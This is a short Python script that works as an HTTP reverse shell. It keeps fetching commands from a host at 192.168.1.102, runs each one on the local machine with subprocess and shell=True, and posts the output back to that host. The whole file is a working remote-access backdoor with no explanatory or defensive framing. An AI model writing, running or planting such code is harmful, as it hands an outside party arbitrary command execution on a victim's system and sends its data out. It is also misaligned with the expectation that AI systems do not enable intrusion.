import requests
import subprocess
from time import sleep

while True:
	r = requests.get('http://192.168.1.102')
	cmd = r.text
	print(cmd)
	if not cmd:
		break
	else:
		do = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
		send_r= requests.post(url="http://192.168.1.102",data=do.stdout.read())
		send_r= requests.post(url="http://192.168.1.102",data=do.stderr)
	sleep(3)
